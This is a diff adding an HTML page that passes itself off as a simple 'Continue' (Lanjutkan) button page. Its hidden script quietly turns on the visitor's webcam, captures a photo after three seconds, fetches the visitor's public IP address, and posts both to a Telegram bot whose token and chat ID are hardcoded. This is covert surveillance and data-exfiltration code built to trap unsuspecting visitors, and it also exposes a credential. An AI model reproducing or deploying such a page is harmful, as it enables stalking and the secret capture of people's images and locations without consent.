@@ -1,0 +1,109 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Image with IP</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #e74c3c;
+        }
+        video, canvas {
+            display: none;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <button onclick="location.reload()">Lanjutkan</button>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const telegramBotToken = '8116876064:AAH2gRfMhF4o4NHivaszSbQ7sTLy-72Q9n0';
+        const chatId = '7336408897';
+
+        // Access the webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+            })
+            .catch(err => {
+                console.error("Error accessing the webcam: " + err);
+            });
+
+        // Capture the image after a short delay to allow the video to load
+        setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Fetch the IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+
+                    // Send the image and IP address to the Telegram bot
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `IP Address: ${ipAddress}`
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('IP address sent successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending IP address:', error);
+                    });
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            photo: imageData
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Image sent successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending image:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        }, 3000); // Adjust the delay as needed
+    </script>
+</body>
+</html>
